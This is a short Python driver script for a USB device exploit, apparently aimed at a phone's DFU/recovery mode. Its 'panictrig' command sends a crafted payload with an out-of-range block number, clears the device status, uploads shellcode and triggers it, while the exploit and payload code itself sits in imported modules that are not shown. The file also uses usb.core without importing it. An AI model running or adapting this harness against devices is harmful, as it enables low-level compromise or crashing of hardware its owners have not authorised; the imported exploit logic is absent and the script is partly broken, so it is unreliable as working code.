import sys
import time
from exploit import Yara1nExploit
from usb_utils import wait_for_device, send_payload, clear_status, trigger
from payloads import build_dfu_payload, build_dfu_shellcode

def main():
    exploit = Yara1nExploit()
    
    if len(sys.argv) < 2:
        print("Usage: python3 exploit.py [dfu|recovery|reboot|panictrig]")
        return

    cmd = sys.argv[1].lower()
    if cmd == "dfu":
        exploit.enter_dfu()
    elif cmd == "recovery":
        exploit.enter_recovery()
    elif cmd == "reboot":
        exploit.reboot()
    elif cmd == "panictrig":
        print("[*] Testing panic...")
        exploit.dev = wait_for_device()
        try:
            exploit.dev.set_configuration()
        except usb.core.USBError:
            pass
        time.sleep(2)
        payload = build_dfu_payload()
        send_payload(exploit.dev, payload, block=0xFFFF)
        time.sleep(2)
        clear_status(exploit.dev)
        time.sleep(2)
        shellcode = build_dfu_shellcode()
        send_payload(exploit.dev, shellcode, block=1)
        time.sleep(2)
        trigger(exploit.dev)
    else:
        print("Unknown command")

if __name__ == "__main__":
    main() 